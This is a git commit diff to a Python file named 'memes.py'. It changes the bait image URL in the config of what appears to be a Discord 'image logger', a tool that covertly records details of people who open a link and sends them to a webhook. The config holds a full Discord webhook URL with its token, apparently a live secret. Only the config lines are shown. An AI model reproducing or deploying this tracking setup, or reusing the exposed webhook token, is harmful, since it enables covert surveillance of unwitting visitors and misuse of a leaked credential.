cc488fc1d49a477a26b4ac2ca40d890e798ae90e
hilluz <72068174+hilalmr@users.noreply.github.com>
2025-01-31 16:29:48 +0400

    Update memes.py

--- memes.py
+++ memes.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334861934742208543/5uBPJITGopxMiC_QEyk-P3mpwNM46VJRV7fC0k-WTXISRJVaUmn_JWpNVPTTyWx10yjJ",
-    "image": "https://c.tenor.com/_4YgA77ExHEAAAAd/rick-roll.gif", # You can also have a custom image by using a URL argument
+    "image": "https://fileinfo.com/img/ss/xl/jpg_44-2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
